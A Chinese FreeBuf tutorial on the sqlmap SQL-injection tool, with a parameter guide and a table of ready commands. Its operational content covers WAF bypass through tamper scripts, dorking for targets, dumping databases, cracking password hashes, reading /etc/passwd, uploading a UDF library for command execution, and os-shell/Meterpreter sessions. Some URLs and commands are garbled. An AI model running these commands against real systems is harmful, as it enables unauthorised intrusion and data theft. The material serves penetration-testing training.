##  0X00 背景

**写这篇技术文有两个诱因，一是大菲兄弟@大菲哥和朋友从国外买了一篇二十美刀的XSS文章，做了翻译，自古XSS和sql注入是倚天屠龙的对立统一关系，所以有朋友说想看一看sql注入的文章。**

 **二是大概一年前一朋友对sqlmap的使用除了-u参数几乎一无所知，让我给做了个使用手册，刚好拿出来在此基础上进行完善和优化。**

我本人是owasp北京分会的负责人，owasp的top10几乎一直是sql注入独揽第一，所以也想就这个机会把sql注入好好给大家聊一聊，本文也参考了众多前辈的经验，在这里向每个奉献、开源的前辈说一声感谢。

有些朋友说想让聊聊手工注入，首先我个人手工注入技巧不是很好，再者手工注入需要一定的技术积累和编程底子，受众有限，后期有机会再深入谈。我个人在渗透上的看法是工具是人类进步的象征，工具的使用绝对是自动化、智能化和量化不可或缺的内容，当然，工具毕竟是死的，好的安全人肯定是左手自动化右手人工。

##  **0X01 SqlMap** **介绍及分析**

SQLMAP是一种开源渗透测试工具，可自动执行SQL注入缺陷的检测和开发过程，并接管数据库服务器。它有强大的检测引擎,针对不同类型的数据库提供多样的渗透测试功能选项，实现数据库识别、数据获取、访问DBMS\操作系统甚至通过带外数据连接的方式执行操作系统的命令。，以及从数据库指纹识别、从数据库获取数据、访问底层文件的广泛范围的交换机通过带外连接在操作系统上执行命令.

> sqlmap is anopen source penetration testing tool that automates the process
> of detectingand exploiting SQL injection flaws and taking over of database
> servers. Itcomes with a powerful detection engine, many niche features for
> the ultimatepenetration tester and a broad range of switches lasting from
> database fingerprinting,over data fetching from the database, to accessing
> the underlying file systemand executing commands on the operating system via
> out-of-band connections.（源于官方介绍）

SQLMAP支持的数据包括：MySQL, Oracle,PostgreSQL,Microsoft SQL Server, Microsoft Access,
IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库。

SQLMAP目前支持的注入方式包括（默认全进行）：

> l B: Boolean-based blind SQL injection（布尔型注入）
>
> l E: Error-based SQL injection（报错型注入）
>
> l U: UNION query SQL injection（可联合查询注入）
>
> l S: Stacked queries SQL injection（可多语句查询注入）
>
> l T: Time-based blind SQL injection（基于时间延迟注入）
>
> l Q: Inline SQL Injection (内联注入)

###  **SQLMAP** **分析：** ****

SQLMAP的功能模块参数由几大类构成（见下表），分别是：

Target:At least one of these options has to be provided to define the
target(s)  |  目标：至少为目标提供一个选项  
---|---  
Request:These options can be used to specify how to connect to the target URL
|  请求：这些选项用于指定如何连接目标URL的方法  
Optimization:These options can be used to optimize the performance of sqlmap
|  优化：这些选项用来优化sqlmap的性能  
Injection:These options can be used to specify which parameters to test for,
|  注入：这些选项用于指定测试那些参数，提供注入payload和篡改脚本  
Detection:These options can be used to customize the detection phase  |
侦测：这些选项用于侦测阶段的定制化  
Techniques:These options can be used to tweak testing of specific SQL
injection techniques  |  技巧：这些选项用于调整特定sql注入技术的技巧  
Enumeration:These options can be used to enumerate the back-end database
management system information, structure and data contained in the tables.
Moreover you can run your own SQL statements  |
枚举：这些选项可用于枚举后端数据库管理系统信息、表里的数据接口，此外还可以运行你的sql语句  
Brute force:These options can be used to run brute force checks  |
暴力执行：这些选项用于暴力检查  
User-defined function injection:These options can be used to create custom
user-defined functions  |  用户定义注入函数:这些选项用于建立用户定义函数  
File system access:These options can be used to access the back-end database
management system underlying file system  |  访问文件系统：这些选项用于访问后端数据库管理系统的底层文件系统  
Operating system access:These options can be used to access the back-end
database management system underlying operating system  |
操作系统连接：这些选项用于连接后端DBMS底层的os  
Windows registry access:These options can be used to access the back-end
database management system Windows registry  |  windows
注册表连接：这些选项用于连接后端DBMS的windows 注册表  
General: These options can be used to set some general working parameters  |
通用：这些选项用于设置一些通用参数  
  
### **SQLMAP** **下载及学习地址：** ****

 **下载：** **.tar.gz** **或者** **.zip**

 **Homepage:** [http://sqlmap.org](http://sqlmap.org/)

### **CommitsRSS** **学习地址：** ****

 **feed:**<https://github.com/sqlmapproject/sqlmap/commits/master.atom>

**Issue tracker:**<https://github.com/sqlmapproject/sqlmap/issues>

**User's manual:**<https://github.com/sqlmapproject/sqlmap/wiki>

**(FAQ):**<https://github.com/sqlmapproject/sqlmap/wiki/FAQ>

**Twitter:** @sqlmap

**Demos:**<http://www.youtube.com/user/inquisb/videos>

**Screenshots:**<https://github.com/sqlmapproject/sqlmap/wiki/Screenshots>

##  **0X02 Sqlmap** **使用经验总结** ****

以下参数在进行SQL注入时配置恰当会使得注入攻击事半功倍。以下是笔者对SQLmap 使用的经验总结：

**1** |  在使用-v参数的时候，尽量选择，3级别，次级别可以显示注入的参数。 例如：sqlmap -v3 -u
[www.potian.com](http://www.potian.com)  
---|---  
**2** |  当一件知道数据库信息的时候，使用-d直接连接数据库，注意-D是指定目标库，要区分。  
例如：-d mysql://POTIAN : 123123 @127.0.0.1:3306/ ORDER  
**3** |  当使用Burp或WebScarab保存了日志的时候，想从日志文件中筛选目标，可使用-I使用 绝对路径地址即可。  
**4** |  -g可以使用google的搜索结果，例如，直接搜索uid=，查找具有此参数的站点，直接使用sqlmap调用google结果，例：
**sqlmap** -g inurl:php?uid=。（收集了一些语句，在附表）当需要使用-g
inurl:php?uid=等参数时，默认无法访问，可使用此参数+海外代理方式使用此功能。当代理需要验证的时候，使用-cre指定身份信息，需要使用代理轮巡时，使用文件加载代理设置列表，使用代理轮询也可在对访问ip次数进行了验证的场景使用。（鉴于我国国情，不建议使用）  
**5**|  服务端允许的情况下，--method改变默认的http方法，和其他参数配合使用，例如--data，改变为post然后推送数据。  
**6** |  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/*.*-dev-xxxxxxx(<http://sqlmap.org>) 可以使用–user-agent参数来指定想使用的UA，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入.另外UA是绕过waf的参数，--user-agent= --random-agent这两个参数可对waf针对恶意ua的防控进行绕过。  
**7** |
指定http请求中的header里的host参数、在请求中伪造referer，有些waf和安全产品等会对refer进行限制，仅允许本站referer，当waf参数对referer进行了限制后，可使用此参数进行绕过。当–level参数设定为3或者3以上的时候会尝试对referer注入指定其他的header信息，XFF等，例如strust2-045使用了Content-Type  
**8** |
HTTP代理身份验证凭据，可自动使用username：password和秘钥文件，例如有些访问会使用key文件，集团sso最爱出现此种场景，在这种身份验证凭据的需求中，也可使用-I参数使用burp等代理记录文件来使用身份凭据  
**9** |
设置http请求间隔时间，在绕过需求时使用，例如单ip单位时间访问多少次，可配合代理和多代理参数使用。超时连接后的尝试间隔，默认30s，可手动调整，一般--timeout和--retries配合使用  
**10**|  有的网站会对提交的参数进行编码或加密，这时候需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。  
例子：--eval=""import
hashlib;hash=hashlib.md5(id).hexdigest()""上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。"  
**11** |  sqlmap默认测试所有的GET和POST参数，上文提到过，当--level的值大于等于2的时候也会测试HTTP
Cookie头的值，大于等于3的时候也会测试User-Agent和HTTP Referer头的值。这时候可以手动指定-p参数设置想要测试的参数。 例如：-p
""id,cookie""但是有个别参数不想测试的时候可以使用--skip=“user-agent”参数。  
**12** |  数值处理：参数：--invalid-bignum --invalid-logical这两个参数对报错数据、无效数据进行更改，例如默认报错UID=-20,可以通过制定以上参数制定无效的大数字和逻辑，比如uid=999999999和uid=20
and a=b  
参数：--prefix,--suffix在注入的payload的前面或者后面加一些字符，来保证payload的正常执行，例如在语句中增加--prefix
""’)"" --suffix ""AND (’1’=’1""  
**13** |  \--tamper可从tamper库里查找相关内容，使用--tamper tamper/*.py方式指定  
**14** |  上文多次解释--level对测试参数的影响，一共有五个等级，默认为1，sqlmap使用的payload可以在payloads.xml中看到，你也可以根据相应的格式添加自己的payload内容，默认也有一些，可定制。  
\--level的值大于等于2的时候也会测试HTTP Cookie头的值，大于等于3的时候也会测试User-Agent和HTTP
Referer头的值，建议最高级别，会更慢、测试参数更复杂。  
**15** |
risk从0-3共有四个风险等级，默认是1，risk1会测试大部分的测试语句，risk2会增加基于事件的测试语句，3会增加OR语句的注入测试。测试的语句同样可以在payloads.xml中找到，可以自行添加payload。  
警告：当使用高级别时，可能会使用drop、update等高危语句对整表、整库造成影响，可能导致更新的整个表，可能造成很大的风险。  
**16** |
"sqlmap测试结果取决于返回内容，当页面在刷新或更新后，可能导致返回不同的内容，特别是页面有动态内容的情况下。为了避免误报，可指定字符串或者正则表达式来区分原始页面和报错页面（--string参数添加字符串，--regexp添加正则），也可以提供一段字符串在原始页面与true下的页面都不存在的字符串，而false页面中存在的字符串（--not-string添加）。  
用户也可以提供true与false返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，--code=200。  
**17** |
默认sqlmap会把BEUSTQ六中注入方式全来一遍，可根据实际情况进行调整，例如可使用时间延迟，看网站响应时间来判断是否有注入，可根据报错判断注入。如果不是很懂，就不用管，虽然时间长点，但很全面。  
B:Boolean-based blind SQL injection（布尔型注入）  
E:Error-based SQL injection（报错型注入）  
U:UNION query SQL injection（可联合查询注入）  
S:Stacked queries SQL injection（可多语句查询注入）  
T: Time-based blind SQL injection（基于时间延迟注入）  
Q: Inline SQL Injection (内联注入)  
当使用基于时间延迟注入的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒，可以根据环境记性调整，比如网络延迟很大，可适当增加延时时间  
**18** |  \--union-cols设定的值为一段整数范围，制定区间，此数值默认为1-10，随着--levle增加，当为5的时候增加为50，当level级别和取值范围不匹配，在低级别需求更大的范围，可通过设定--union-cols的值来实现。设定union查询使用的字符，默认使用NULL，但是可能会返回失败，--union-char指定UNION查询的字符。指定查询的表，配合上文暴力破解的字符、范围等来详细使用。  
**19** |
在一旦注入成功且获得精确信息通过以下详细参数来指定检索、枚举动作和动作执行对象：检索DBMS的指纹特征、数据库、host值、用户身份、并对用户、密码、权限、角色进行枚举也就是爆破。然后尝试枚举数据库、数据库里的表、数据库里的内容、可以使用count来统计条目等操作。dump和dump-all就是脱裤和全脱的区别，dump某表的十条八条可能没事儿，dump-all注定要浪迹天涯，也就是所谓的从脱裤到跑路的开始，通过-D\\-T\\-C来制定索要枚举的库、表、和列，使用-X来排除不想要的列，特别是有多列且有无意义字段的时候，使用-X可大大节省时间。 --exclude-sysdbs参数，将不会获取数据库自带的系统库内容，可减少干扰内容，对-count的使用和枚举信息的使用建议搭配此参数来排除系统库。  
当我们不想跑路的时候，那么请使用下面内容：  
\--start=LIMITSTART First query output entry to retrieve指定从第几行开始输出，如：  
\--start=1  
\--stop=LIMITSTOP  
Last query output entry to retrieve  
指定从第几行停止输出  
\--stop=10  
\--first=FIRSTCHAR  
First query output word character to retrieve  
指定从第几个字符开始输出  
\--first 1  
\--last=LASTCHAR  
Last query output word character to retrieve  
指定从第几个字符停止输出--last10  
**20** |  暴力检查：猜测检查常见的、通用的表名和列名，可通过下面两个文件进行定制化，暴力破解的表在txt/common-tables.txt文件中，暴力破解的列名在txt/common-columns.txt中  
**21** |  对文件系统、操作系统的交互和使用必须需要相应的权限，前面提到要求具有特定的函数执行特权，一般要求root。针对文件系统的读写：对--file-read配置绝对系统路径，可读取相应文件内容，可以是文本，也可以是二进制，条件是必须拥有相对应特权，已知的是mysql、postgresql和sqlserver。写入也是同样，往远端后台的DBMS里写入一个本地文件，可通过
--file-dest指定绝对文件路径。" 当然和上面可以配合使用，当数据库为MySQL，PostgreSQL或Microsoft SQL
Server，并且当前用户有权限使用特定的函数。然后通过上面的文件系统管理上传一个库，使用可执行系统命令的sys_exec()和sys_eval()，甚至xp_cmdshell存储过程
--os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。 Meterpreter配合使用 --os-pwn，--os-smbrelay，--os-bof，--priv-esc，--msf-path，--tmp-path配合Meterpreter使用，当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，四种方式执行它：  
1.通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。  
2.通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL
Server的xp_cmdshell()函数，参数：--os-pwn。  
3.通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。  
4.通过溢出Microsoft SQL Server
2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof。  
**22** |
所见即所得，注册表连接指的是windows系统，相信大家都有windows系统知识，不懂注册表基本就不懂windows系统，所有的windows系统配置在注册表里都可实现，比如开启远程连接、比如新建用户、比如组策略配置、比如防火墙等等，reg可对注册表内容进行读取、编辑、和删除，上面和下面相配合可实现对指定的key、value、data和类型进行操作。  
**23** |  \--batch  
在使用sqlmap时，有时一些响应需要用户交互，输入Y、N、skip、quit等，使用此选项可使用默认配置。  
\--output-dir=  
指定输出路径，方式控制台输出过多，无法查看，也方便记录  
\--gpage=GOOGLEPAGE  
好像默认是使用google搜索的前100个文件，当使用前面的-g参数，配合此参数指定页面  
\--identify-waf  
进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别  
\--mobile  
使用移动产品UA，把sqlmap伪装成手机，也可使用前面的  
-user-agent  
自己指定  
\--smart  
智能深度启发式扫描，或许会有惊喜呢。  
\--wizard 和上面的完全不同，纯新手选择，一步步让你输入url等参数，基本输入个url就行。  
  
## **0X03 Sqlmap** **实操语句** ****

**1** |  手工基本检测和判断（在注入点使用or、and等可判断是否有注入点）  |
原始网页：<http://www.potian.com/mysql/product/user_info.php?uid=1> 024  
构造url1：<http://www.potian.com/mysql/product/user_info.php?uid=1> 024+AND+1=1  
构造url2：<http://www.potian.com/mysql/product/user_info.php?uid=1> 024+AND+1=1
025 ****  
---|---|---  
**2** |  基础检测语法 **** |  sqlmap.py -u
<http://www.potian.com/mysql/product/user_info.php?uid=1> 024 ****  
**3** |  批量检测  |  “sqlmap.py -m target.txt”，注意target.txt跟sqlmap在同一个目录下。 ****  
**4** |  绕过WAF进行SQL注入  |  （1）修改\sqlmap\tamper\halfversionedmorekeywords.py
return match.group().replace(word, ”/*!0%s” % word) 为：return
match.group().replace(word, ”/*!50000%s*/” % word)  
（2）修改\sqlmap\xml\queries.xml <cast query= ”CAST(%s ASCHAR)”/>为：<castquery=
”convert(%s,CHAR)”/>  
（3）使用sqlmap进行注入测试sqlmap.py -u ”<http://www.potian.com/detail.php?> id=16″
–tamper “halfversionedmorekeywords.py”  
其它绕过waf脚本方法：sqlmap.py-u “
<http://www.potian.com/mysql/product/user_info.php?uid=1> 024”
–tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3  
（4）tamper目录下文件具体含义：  
space2comment.py  
用/**/代替空格  
apostrophemask.py  
用utf8代替引号  
equaltolike.pylike  
代替等号  
space2dash.py  
绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）  
greatest.py  
绕过过滤’>’ ，用GREATEST替换大于号。  
space2hash.py  
空格替换为#号,随机字符串以及换行符  
apostrophenullencode.py  
绕过过滤双引号，替换字符和双引号。  
halfversionedmorekeywords.py  
当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论  
space2morehash.py  
空格替换为#号  
以及更多随机字符串  
换行符  
appendnullbyte.py  
在有效负荷结束位置加载零字节字符编码  
ifnull2ifisnull.py  
绕过对IFNULL过滤，替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py(mssql)
空格替换为其它空符号  
base64encode.py  
用base64编码替换  
space2mssqlhash.py  
替换空格  
modsecurityversioned.py  
过滤空格，包含完整的查询版本注释  
space2mysqlblank.py  
空格替换其它空白符号(mysql)  
between.py  
用between替换大于号（>）  
space2mysqldash.py  
替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）  
multiplespaces.py  
围绕SQL关键字添加多个空格  
space2plus.py  
用+替换空格  
bluecoat.py  
代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like  
nonrecursivereplacement.py  
双重查询语句，取代SQL关键字  
space2randomblank.py  
代替空格字符（“”）从一个随机的空白字符可选字符的有效集  
sp_password.py  
追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾  
chardoubleencode.py  
双url编码(不处理以编码的)  
unionalltounion.py  
替换UNION ALLSELECT UNION SELECT  
charencode.py  
url编码  
randomcase.py  
随机大小写  
unmagicquotes.py  
宽字符绕过  
GPCaddslashes randomcomments.py  
用/**/分割sql关键字  
charunicodeencode.py  
字符串unicode编码  
securesphere.py  
追加特制的字符串  
versionedmorekeywords.py  
注释绕过 space2comment.py  
替换空格字符串(‘‘) 使用注释‘/**/’  
halfversionedmorekeywords.py  
关键字前加注释 ****  
**5** |  URL重写SQL注入测试  | value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。
sqlmap.py -u ” <http://www.potian.com/param1/value1> */param2/value2/”  
**6** |  列举并破解密码哈希值 | 当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
sqlmap.py -u ” <http://www.potian.com/sqlmap/pgsql/get_int.php?id=1> ”
–passwords -v1 ****  
**7** |  获取表中的数据个数  |  sqlmap.py -u ”
<http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1> ” –count -Dtestdb
****  
**8** |  站点爬取  |  sqlmap.py -u “ <http://www.secbang.com> “–batch –crawl=3
****  
**9** |  注入时间预估（基于布尔）  |  sqlmap.py -u “
<http://www.secbang.com/sqlmap/oracle/get_int_bool.php?id=1> “-b –eta ****  
**10** |  使用hex避免字符编码导致数据丢失  |  sqlmap.py -u “
<http://www.secbang.com/pgsql/get_int.php?id=1> ” –banner –hex -v 3 –parse-errors ****  
**11** |  模拟测试手机环境站点  |  python sqlmap.py -u ”
<http://www.secbang.com/vuln.php?id=1> ” –mobile ****  
**12** |  智能判断测试  |  sqlmap.py -u “ <http://www.secbang.com/info.php?id=1>
“–batch –smart ****  
**13** |  结合burpsuite进行注入  |  sqlmap.py -r burpsuite 抓包.txt ****  
**14** |  sqlmap 自动填写表单注入  |  sqlmap.py -u URL –forms sqlmap.py -u URL –forms
–dbs sqlmap.py -u URL –forms –current-db sqlmap.py -u URL –forms -D
数据库名称–tables sqlmap.py -u URL –forms -D 数据库名称 -T 表名 –columns sqlmap.py -u URL
–forms -D 数据库名称 -T 表名 -Cusername，password –dump ****  
**15** |  读取linux下文件  | sqlmap.py-u “url” –file /etc/password ****  
**16** |  sqlmap cookies 注入  |  sqlmap.py -u “
<http://www.potian.com/mysql/product/user_info.php?uid=1> 024“–cookies
“ssuid=*″ –dbs –level 3 sqlmap.py -u 注入点URL --cookie"id=xx" --level 3
sqlmap.py -u url --cookie "id=xx"--level 3 --tables( 猜表名) sqlmap.py -u url
--cookie "id=xx"--level 3 -T 表名 --coiumns sqlmap.py -u url --cookie "id=xx"--level 3 -T 表名 -C username，password --dump ****  
**17** |  连接mysql数据打开一个交互shell  |  sqlmap.py
-dmysql://potian:123123@[www.potian.com:3306/sqlmap](http://www.potian.com:3306/sqlmap)
\--sql-shell select @@version; select @@plugin_dir; ****  
**18** |  利用sqlmap上传lib_mysqludf_sys到MySQL插件目录  |  sqlmap.py
-dmysql://potian:123123@[www.potian.com:3306/sqlmap](http://www.potian.com:3306/sqlmap)
\--file-write=d:/tmp/lib_mysqludf_sys.dll--file-dest=d:\\\wamp2.5\\\bin\\\mysql\\\mysql5.6.17\\\lib\\\plugin\\\lib_mysqludf_sys.dll
CREATE FUNCTION sys_exec RETURNS STRINGSONAME 'lib_mysqludf_sys.dll' CREATE
FUNCTION sys_eval RETURNS STRINGSONAME 'lib_mysqludf_sys.dll' select
sys_eval('ver'); ****  
**19** |  执行shell命令  |  sqlmap.py -u “url” –os-cmd=”netuser” /*执行net user命令*/
sqlmap.py -u “url” –os-shell /*系统交互的shell*/ ****  
**20** |  延时注入  |  sqlmap –dbs -u"url" –delay 0.5 /* 延时0.5秒*/ sqlmap –dbs
-u"url" –safe-freq /* 请求2次*/ ****  
  
## **0X04** **结束语** ****

Sql注入并不只是对数据库的攻击行为，在整个攻击链条涉及到对操作系统、注册表、系统文件、脚本、插件控件、数据、数据库相关等的覆盖，注入用的好，爱人回家早。

仅以此文献给每一个奉献自己知识的朋友和前辈，以上是笔者从业十余年积累的一些经验写出来共享给大家，谢谢你对破天、对freebuf的关注。

see you.

 ***本文作者：破天·张坤，转载请注明来自FreeBuf.COM**

